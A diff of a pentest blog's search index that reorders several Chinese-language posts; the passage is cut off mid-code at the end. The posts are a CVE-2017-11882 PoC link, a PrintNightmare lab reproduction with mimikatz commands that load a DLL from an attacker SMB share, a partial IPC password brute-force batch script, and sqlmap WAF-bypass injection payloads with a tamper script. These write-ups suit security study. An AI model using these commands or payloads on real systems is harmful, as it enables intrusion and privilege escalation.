@@ -50,6 +50,22 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2017-11882 POC</title>
+    <url>/2017/11/21/CVE-2017-11882-POC/</url>
+    <content><![CDATA[<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p>
+<p>如何使用，作者github里写的很清楚</p>
+<p>附上自测gif</p>
+<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif" class="">
+
+
+<h1 id="BTW"><a href="#BTW" class="headerlink" title="BTW"></a>BTW</h1><p>现在此漏洞被冠上全版本通杀的名号，作者也放出3个版本的视频，但我本地测试，却在2016下未成功</p>
+<p>具体环境：win10 [10.0.16299.64] + 破解激活过的office2016</p>
+]]></content>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2020-1472 - Zerologon复现+突破445</title>
     <url>/2020/10/16/CVE-2020-1472-Zerologon%E5%A4%8D%E7%8E%B0+%E7%AA%81%E7%A0%B4445/</url>
     <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>如此好用的漏洞，怎么能没有我？没有实际环境，就用本地复现8，跨起个小猫脸.jpg</p>
@@ -138,119 +154,6 @@
         <tag>CVE</tag>
         <tag>复现</tag>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2017-11882 POC</title>
-    <url>/2017/11/21/CVE-2017-11882-POC/</url>
-    <content><![CDATA[<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p>
-<p>如何使用，作者github里写的很清楚</p>
-<p>附上自测gif</p>
-<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif" class="">
-
-
-<h1 id="BTW"><a href="#BTW" class="headerlink" title="BTW"></a>BTW</h1><p>现在此漏洞被冠上全版本通杀的名号，作者也放出3个版本的视频，但我本地测试，却在2016下未成功</p>
-<p>具体环境：win10 [10.0.16299.64] + 破解激活过的office2016</p>
-]]></content>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2021-1675 - printSpooler复现</title>
-    <url>/2021/07/28/CVE-2021-1675-printSpooler%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="CVE-2021-1675"><a href="#CVE-2021-1675" class="headerlink" title="CVE-2021-1675"></a>CVE-2021-1675</h3><p>Print Spooler是Windows系统中管理打印事务的服务，用于管理所有本地和网络打印队列并控制所有打印工作。Windows系统默认开启该服务，攻击者可绕过RPCAddPrintDriver的身份验证，直接在打印服务器中安装恶意驱动程序。普通用户可以利用此漏洞提升至管理员权限。在域环境下，域用户可以远程利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。</p>
-<h3 id="CVE-2021-34527"><a href="#CVE-2021-34527" class="headerlink" title="CVE-2021-34527"></a>CVE-2021-34527</h3><p>34527的漏洞原理与1675一致，但因为github上发布的EXP可以绕过微软在6月安全补丁更新中发布的1675的修复程序。所以在7月2日，微软官方针对公开的EXP发布了CVE-2021-34527的漏洞公告，并提供临时解决方案，但目前暂未发布修复补丁，此漏洞仍处于0day状态。</p>
-<h3 id="漏洞时间线"><a href="#漏洞时间线" class="headerlink" title="漏洞时间线"></a>漏洞时间线</h3><p>2021-06-09 微软发布月度安全补丁：通告定义CVE-2021-1675为本地提权漏洞<br>2021-06-21 微软更新通告：将CVE-2021-1675改为远程代码执行漏洞<br>2021-07-02 微软紧急发布CVE-2021-34527通告（未发布补丁）</p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><a id="more"></a>
-
-<p>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for x64-based Systems Service Pack 2<br>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for 32-bit Systems Service Pack 2<br>Windows RT 8.1<br>Windows 8.1 for x64-based systems<br>Windows 8.1 for 32-bit systems<br>Windows 7 for x64-based Systems Service Pack 1<br>Windows 7 for 32-bit Systems Service Pack 1<br>Windows Server 2016  (Server Core installation)<br>Windows Server 2016<br>Windows 10 Version 1607 for x64-based Systems<br>Windows 10 Version 1607 for 32-bit Systems<br>Windows 10 for x64-based Systems<br>Windows 10 for 32-bit Systems<br>Windows Server, version 20H2 (Server Core Installation)<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows Server, version 2004 (Server Core installation)<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server 2019  (Server Core installation)<br>Windows Server 2019<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems</p>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>该漏洞可实现<strong>本地提权</strong>和<strong>RCE</strong><br>测试脚本（<code>ps1</code>）：</p>
-<blockquote>
-<p><a href="https://github.com/calebstewart/CVE-2021-1675.git">https://github.com/calebstewart/CVE-2021-1675.git</a></p>
-</blockquote>
-<h3 id="1-检测"><a href="#1-检测" class="headerlink" title="1. 检测"></a>1. 检测</h3><p>使用<code>Impacket</code>套件检测</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 rpcdump.py @<span class="number">192.168</span><span class="number">.2</span><span class="number">.118</span> | findstr MS-RPRN</span><br></pre></td></tr></table></figure>
-<p>若存在漏洞：</p>
-<blockquote>
-<p>Protocol: [MS-RPRN]: Print System Remote Protocol</p>
-</blockquote>
-<p><img src="detect.png" alt="detect"></p>
-<h3 id="2-本地提权测试结果"><a href="#2-本地提权测试结果" class="headerlink" title="2. 本地提权测试结果"></a>2. <strong>本地提权</strong>测试结果</h3><ul>
-<li>2008</li>
-</ul>
-<p>域环境和本地均测试失败<br><img src="2008.png" alt="2008"></p>
-<ul>
-<li>2012</li>
-</ul>
-<p>普通用户，提权失败<br><img src="2012_fail.png" alt="2012_fail"></p>
-<p>管理员，提权成功<br><img src="2012_success.png" alt="2012_success"></p>
-<p>该脚本完成提权会直接创建一个管理员用户，可以看到2012成功在管理员权限下，并无意义</p>
-<h3 id="3-RCE测试结果"><a href="#3-RCE测试结果" class="headerlink" title="3. RCE测试结果"></a>3. <strong>RCE</strong>测试结果</h3><p>先开启<code>smb</code>匿名访问，使用<code>3gstudent</code>的脚本开启</p>
-<blockquote>
-<p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p>
-</blockquote>
-<p><img src="3gstudent.png" alt="3gstudent"></p>
-<p>开启成功，用目标机2012访问<code>\\192.168.2.50\smb\</code>正常</p>
-<ul>
-<li>使用<code>cube0x0</code>脚本攻击<blockquote>
-<p><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
-</blockquote>
-</li>
-</ul>
-<p><img src="cube0x0_failed.png" alt="cube0x0_failed"></p>
-<p>利用失败，查询错误原因，发现作者说要使用他魔改的<code>impacket</code></p>
-<blockquote>
-<p><a href="https://github.com/cube0x0/CVE-2021-1675/issues/48">https://github.com/cube0x0/CVE-2021-1675/issues/48</a></p>
-</blockquote>
-<p>重装，再次攻击，还是失败<br><img src="cube0x0_failed2.png" alt="cube0x0_failed2"></p>
-<ul>
-<li>使用<code>mimikatz</code>攻击</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">misc::<span class="title">printnightmare</span> /<span class="title">server</span>:192.168.2.104 /<span class="title">library</span>:\\192.168.2.50\<span class="title">smb</span>\<span class="title">server.dll</span></span></span><br><span class="line"><span class="function"><span class="title">misc</span>::<span class="title">printnightmare</span> /<span class="title">server</span>:192.168.2.104 /<span class="title">authuser:test</span> /<span class="title">authpassword</span>:1<span class="title">qaz</span>@<span class="title">WSX</span> /<span class="title">library</span>:\\192.168.2.50\<span class="title">smb</span>\<span class="title">server.dll</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="mimikatz.png" alt="mimikatz"></p>
-<p>均提示<code>0x5 access denied</code>，但实际上目标访问<code>dll</code>是正常的</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞虽然显示为通杀，但实测低版本成功率较低，高版本未测，据说能成功<br>坑点较多，基本都是<code>smb</code>匿名访问不到造成<br>通用性并不是很强，针对高版本<code>windows</code>（2016等）成功率才会高一些，<br>提权较为实用，<code>RCE</code>用于域控才能发挥最大效益</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.t00ls.net/viewthread.php?tid=62007">https://www.t00ls.net/viewthread.php?tid=62007</a><br><a href="https://www.t00ls.net/viewthread.php?tid=61657">https://www.t00ls.net/viewthread.php?tid=61657</a><br><a href="https://www.t00ls.net/thread-62109-1-1.html">https://www.t00ls.net/thread-62109-1-1.html</a></p>
-]]></content>
-      <tags>
-        <tag>CVE</tag>
-        <tag>复现</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IPC暴破 - Bat</title>
-    <url>/2018/12/20/IPC%E6%9A%B4%E7%A0%B4-Bat/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在内网环境中，掌握一些密码后，最基础，最有效获取服务器权限的方式即<code>ipc</code>暴破</p>
-<p>关于<code>ipc</code>暴破，这类工具在网上见的不多。目前工作中见到的有直接开无数个<code>cmd</code>的伪<code>bat</code>，还有身边同事<code>powershell</code>写的<code>ps1</code>，<code>powershell</code>是挺好用的，但有个关键问题是目标机器必须是<code>win7</code>及以上，遇到老机器当然是没法用了。</p>
-<p>因此，bat无疑是首选，因其语言较底层，不够高级，写起来比较吃力</p>
-<p>花了几天时间改了几个版本，解决了密码特殊字符，菜刀判断进程等各种问题，更新日志在<code>update.txt</code>，应用在自己的实战中。</p>
-<div class="note info"><p>阅读本篇文章能了解到：<span class="label success">IPC</span>, <span class="label success">Bat</span></p></div>
-
-<a id="more"></a>
-
-<h2 id="0x02-Bat"><a href="#0x02-Bat" class="headerlink" title="0x02 Bat"></a>0x02 Bat</h2><p>需要提供以下两个文件</p>
-<blockquote>
-<p><code>username.txt</code>, <code>password.txt</code></p>
-</blockquote>
-<p><code>password.txt</code>：不必多说，放入密码即可，一行一个</p>
-<p><code>username.txt</code>：放入对应的<code>域\用户</code>，大概是<code>win2012</code>以上域时，在<code>ipc</code>连接时必须加入域，为了兼容高版本，所以直接以<code>域\用户</code>形式存入文件</p>
-<p>举个例子：</p>
-<figure class="highlight bat"><figcaption><span>username.txt</span></figcaption><table><tr><td class="code"><pre><span class="line">localhost\administrator</span><br><span class="line">red.ad\redn3ck</span><br></pre></td></tr></table></figure>
-
-<p>本来想直接在<code>bat</code>中用数组写入<code>username</code>，因为批处理中不自带数组功能，先是实现了数组，结果因为变量延迟导致密码为特殊字符时，如<code>!,^</code>等，导致这些字符无法带入命令，会被批处理吞没，花了好久时间也没搞定如何解决此问题，有解决方法的老哥还望指导</p>
-<h3 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h3><p><img src="ipc.png" alt="ipc"></p>
-<div class="note warning"><p>温馨提示：程序启动会在当前目录生成`ip.txt`，即`-h`参数指定的ip段，程序结束时会自动删除并生成`out.txt`。</p></div>
-
-<h2 id="0x03-Code"><a href="#0x03-Code" class="headerlink" title="0x03 Code"></a>0x03 Code</h2><figure class="highlight bat"><figcaption><span>ipc.bat</span></figcaption><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:<span class="built_in">start</span></span><br><span class="line"><span class="keyword">if</span> &quot;%<span class="number">1</span>&quot;==&quot;&quot; <span class="keyword">goto</span> usage</span><br><span class="line"><span class="keyword">if</span> &quot;%<span class="number">1</span>&quot;==&quot;-h&quot; <span class="keyword">goto</span> ip-range</span><br><span class="line"></span><br><span class="line">:usage</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Usage:</span><br><span class="line"><span class="built_in">echo</span> 	[-h ips]	host(ip) range, <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span>-<span class="number">255</span></span><br><span class="line"><span class="built_in">echo</span> 	tips:		password.txt is needed.</span><br><span class="line"><span class="built_in">echo</span> 			username.txt is needed.</span><br><span class="line"><span class="built_in">echo</span> 			ipc.bat can <span class="keyword">not</span> add <span class="built_in">path</span> like &#x27;c:\programdata\ipc.bat&#x27;.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> example:</span><br><span class="line"><span class="built_in">echo</span> 	ipc.bat -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span>-<span class="number">255</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.t00ls.net/thread-30632-1-1.html">https://www.t00ls.net/thread-30632-1-1.html</a></p>
-]]></content>
-      <tags>
-        <tag>IPC</tag>
-        <tag>bat</tag>
       </tags>
   </entry>
   <entry>
@@ -371,6 +274,124 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2021-1675 - printSpooler复现</title>
+    <url>/2021/07/28/CVE-2021-1675-printSpooler%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="CVE-2021-1675"><a href="#CVE-2021-1675" class="headerlink" title="CVE-2021-1675"></a>CVE-2021-1675</h3><p>Print Spooler是Windows系统中管理打印事务的服务，用于管理所有本地和网络打印队列并控制所有打印工作。Windows系统默认开启该服务，攻击者可绕过RPCAddPrintDriver的身份验证，直接在打印服务器中安装恶意驱动程序。普通用户可以利用此漏洞提升至管理员权限。在域环境下，域用户可以远程利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。</p>
+<h3 id="CVE-2021-34527"><a href="#CVE-2021-34527" class="headerlink" title="CVE-2021-34527"></a>CVE-2021-34527</h3><p>34527的漏洞原理与1675一致，但因为github上发布的EXP可以绕过微软在6月安全补丁更新中发布的1675的修复程序。所以在7月2日，微软官方针对公开的EXP发布了CVE-2021-34527的漏洞公告，并提供临时解决方案，但目前暂未发布修复补丁，此漏洞仍处于0day状态。</p>
+<h3 id="漏洞时间线"><a href="#漏洞时间线" class="headerlink" title="漏洞时间线"></a>漏洞时间线</h3><p>2021-06-09 微软发布月度安全补丁：通告定义CVE-2021-1675为本地提权漏洞<br>2021-06-21 微软更新通告：将CVE-2021-1675改为远程代码执行漏洞<br>2021-07-02 微软紧急发布CVE-2021-34527通告（未发布补丁）</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><a id="more"></a>
+
+<p>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for x64-based Systems Service Pack 2<br>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for 32-bit Systems Service Pack 2<br>Windows RT 8.1<br>Windows 8.1 for x64-based systems<br>Windows 8.1 for 32-bit systems<br>Windows 7 for x64-based Systems Service Pack 1<br>Windows 7 for 32-bit Systems Service Pack 1<br>Windows Server 2016  (Server Core installation)<br>Windows Server 2016<br>Windows 10 Version 1607 for x64-based Systems<br>Windows 10 Version 1607 for 32-bit Systems<br>Windows 10 for x64-based Systems<br>Windows 10 for 32-bit Systems<br>Windows Server, version 20H2 (Server Core Installation)<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows Server, version 2004 (Server Core installation)<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server 2019  (Server Core installation)<br>Windows Server 2019<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>该漏洞可实现<strong>本地提权</strong>和<strong>RCE</strong><br>测试脚本（<code>ps1</code>）：</p>
+<blockquote>
+<p><a href="https://github.com/calebstewart/CVE-2021-1675.git">https://github.com/calebstewart/CVE-2021-1675.git</a></p>
+</blockquote>
+<h3 id="1-检测"><a href="#1-检测" class="headerlink" title="1. 检测"></a>1. 检测</h3><p>使用<code>Impacket</code>套件检测</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 rpcdump.py @<span class="number">192.168</span><span class="number">.2</span><span class="number">.118</span> | findstr MS-RPRN</span><br></pre></td></tr></table></figure>
+<p>若存在漏洞：</p>
+<blockquote>
+<p>Protocol: [MS-RPRN]: Print System Remote Protocol</p>
+</blockquote>
+<p><img src="detect.png" alt="detect"></p>
+<h3 id="2-本地提权测试结果"><a href="#2-本地提权测试结果" class="headerlink" title="2. 本地提权测试结果"></a>2. <strong>本地提权</strong>测试结果</h3><ul>
+<li>2008</li>
+</ul>
+<p>域环境和本地均测试失败<br><img src="2008.png" alt="2008"></p>
+<ul>
+<li>2012</li>
+</ul>
+<p>普通用户，提权失败<br><img src="2012_fail.png" alt="2012_fail"></p>
+<p>管理员，提权成功<br><img src="2012_success.png" alt="2012_success"></p>
+<p>该脚本完成提权会直接创建一个管理员用户，可以看到2012成功在管理员权限下，并无意义</p>
+<h3 id="3-RCE测试结果"><a href="#3-RCE测试结果" class="headerlink" title="3. RCE测试结果"></a>3. <strong>RCE</strong>测试结果</h3><p>先开启<code>smb</code>匿名访问，使用<code>3gstudent</code>的脚本开启</p>
+<blockquote>
+<p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p>
+</blockquote>
+<p><img src="3gstudent.png" alt="3gstudent"></p>
+<p>开启成功，用目标机2012访问<code>\\192.168.2.50\smb\</code>正常</p>
+<ul>
+<li>使用<code>cube0x0</code>脚本攻击<blockquote>
+<p><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
+</blockquote>
+</li>
+</ul>
+<p><img src="cube0x0_failed.png" alt="cube0x0_failed"></p>
+<p>利用失败，查询错误原因，发现作者说要使用他魔改的<code>impacket</code></p>
+<blockquote>
+<p><a href="https://github.com/cube0x0/CVE-2021-1675/issues/48">https://github.com/cube0x0/CVE-2021-1675/issues/48</a></p>
+</blockquote>
+<p>重装，再次攻击，还是失败<br><img src="cube0x0_failed2.png" alt="cube0x0_failed2"></p>
+<ul>
+<li>使用<code>mimikatz</code>攻击</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">misc::<span class="title">printnightmare</span> /<span class="title">server</span>:192.168.2.104 /<span class="title">library</span>:\\192.168.2.50\<span class="title">smb</span>\<span class="title">server.dll</span></span></span><br><span class="line"><span class="function"><span class="title">misc</span>::<span class="title">printnightmare</span> /<span class="title">server</span>:192.168.2.104 /<span class="title">authuser:test</span> /<span class="title">authpassword</span>:1<span class="title">qaz</span>@<span class="title">WSX</span> /<span class="title">library</span>:\\192.168.2.50\<span class="title">smb</span>\<span class="title">server.dll</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="mimikatz.png" alt="mimikatz"></p>
+<p>均提示<code>0x5 access denied</code>，但实际上目标访问<code>dll</code>是正常的</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞虽然显示为通杀，但实测低版本成功率较低，高版本未测，据说能成功<br>坑点较多，基本都是<code>smb</code>匿名访问不到造成<br>通用性并不是很强，针对高版本<code>windows</code>（2016等）成功率才会高一些，<br>提权较为实用，<code>RCE</code>用于域控才能发挥最大效益</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.t00ls.net/viewthread.php?tid=62007">https://www.t00ls.net/viewthread.php?tid=62007</a><br><a href="https://www.t00ls.net/viewthread.php?tid=61657">https://www.t00ls.net/viewthread.php?tid=61657</a><br><a href="https://www.t00ls.net/thread-62109-1-1.html">https://www.t00ls.net/thread-62109-1-1.html</a></p>
+]]></content>
+      <tags>
+        <tag>CVE</tag>
+        <tag>复现</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IPC暴破 - Bat</title>
+    <url>/2018/12/20/IPC%E6%9A%B4%E7%A0%B4-Bat/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在内网环境中，掌握一些密码后，最基础，最有效获取服务器权限的方式即<code>ipc</code>暴破</p>
+<p>关于<code>ipc</code>暴破，这类工具在网上见的不多。目前工作中见到的有直接开无数个<code>cmd</code>的伪<code>bat</code>，还有身边同事<code>powershell</code>写的<code>ps1</code>，<code>powershell</code>是挺好用的，但有个关键问题是目标机器必须是<code>win7</code>及以上，遇到老机器当然是没法用了。</p>
+<p>因此，bat无疑是首选，因其语言较底层，不够高级，写起来比较吃力</p>
+<p>花了几天时间改了几个版本，解决了密码特殊字符，菜刀判断进程等各种问题，更新日志在<code>update.txt</code>，应用在自己的实战中。</p>
+<div class="note info"><p>阅读本篇文章能了解到：<span class="label success">IPC</span>, <span class="label success">Bat</span></p></div>
+
+<a id="more"></a>
+
+<h2 id="0x02-Bat"><a href="#0x02-Bat" class="headerlink" title="0x02 Bat"></a>0x02 Bat</h2><p>需要提供以下两个文件</p>
+<blockquote>
+<p><code>username.txt</code>, <code>password.txt</code></p>
+</blockquote>
+<p><code>password.txt</code>：不必多说，放入密码即可，一行一个</p>
+<p><code>username.txt</code>：放入对应的<code>域\用户</code>，大概是<code>win2012</code>以上域时，在<code>ipc</code>连接时必须加入域，为了兼容高版本，所以直接以<code>域\用户</code>形式存入文件</p>
+<p>举个例子：</p>
+<figure class="highlight bat"><figcaption><span>username.txt</span></figcaption><table><tr><td class="code"><pre><span class="line">localhost\administrator</span><br><span class="line">red.ad\redn3ck</span><br></pre></td></tr></table></figure>
+
+<p>本来想直接在<code>bat</code>中用数组写入<code>username</code>，因为批处理中不自带数组功能，先是实现了数组，结果因为变量延迟导致密码为特殊字符时，如<code>!,^</code>等，导致这些字符无法带入命令，会被批处理吞没，花了好久时间也没搞定如何解决此问题，有解决方法的老哥还望指导</p>
+<h3 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h3><p><img src="ipc.png" alt="ipc"></p>
+<div class="note warning"><p>温馨提示：程序启动会在当前目录生成`ip.txt`，即`-h`参数指定的ip段，程序结束时会自动删除并生成`out.txt`。</p></div>
+
+<h2 id="0x03-Code"><a href="#0x03-Code" class="headerlink" title="0x03 Code"></a>0x03 Code</h2><figure class="highlight bat"><figcaption><span>ipc.bat</span></figcaption><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:<span class="built_in">start</span></span><br><span class="line"><span class="keyword">if</span> &quot;%<span class="number">1</span>&quot;==&quot;&quot; <span class="keyword">goto</span> usage</span><br><span class="line"><span class="keyword">if</span> &quot;%<span class="number">1</span>&quot;==&quot;-h&quot; <span class="keyword">goto</span> ip-range</span><br><span class="line"></span><br><span class="line">:usage</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> Usage:</span><br><span class="line"><span class="built_in">echo</span> 	[-h ips]	host(ip) range, <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span>-<span class="number">255</span></span><br><span class="line"><span class="built_in">echo</span> 	tips:		password.txt is needed.</span><br><span class="line"><span class="built_in">echo</span> 			username.txt is needed.</span><br><span class="line"><span class="built_in">echo</span> 			ipc.bat can <span class="keyword">not</span> add <span class="built_in">path</span> like &#x27;c:\programdata\ipc.bat&#x27;.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> example:</span><br><span class="line"><span class="built_in">echo</span> 	ipc.bat -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">1</span>-<span class="number">255</span></span><br><span class="line"><span class="keyword">goto</span> :eof</span><br><span class="line">...</span><br><span class="line">..</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.t00ls.net/thread-30632-1-1.html">https://www.t00ls.net/thread-30632-1-1.html</a></p>
+]]></content>
+      <tags>
+        <tag>IPC</tag>
+        <tag>bat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql注入 - Sqlmap之tamper编写</title>
+    <url>/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/</url>
+    <content><![CDATA[<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass @"></a>Bypass <code>@</code></h1><img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@error.png" class="">
+<p>如图，遇到<code>@</code>，导致注入失败，使用mysql表名即可绕过</p>
+<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@.png" class="">
+
+<h1 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h1><a id="more"></a>
+<p>该站存在WAF，<code>union</code>不可与<code>select</code>同时出现，简单使用<code>%0A</code>即可绕过，即<code>union%0Aselect</code>；<br>另外<code>information_schema.tables</code>也被拉黑，fuzz后发现也不难绕，改为<code>information_schema/**/.tables</code>即可绕过。</p>
+<h1 id="Tamper编写"><a href="#Tamper编写" class="headerlink" title="Tamper编写"></a>Tamper编写</h1><p>这下绕过是没问题了，可惜sqlmap跑不了，遂想编写一针对此站的tamper，供sqlmap调用，但因未实现过此方式，翻看sqlmap中<em>tamper</em>，发现很简单，接口已经准备好，只需要对payload进行处理就能让sqlmap调用。</p>
+<p>编写<code>own.py</code>放入<em>tamper</em>目录下即可</p>
+<p><font color=red>注意：sqlmap中的payload均是大写</font></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span 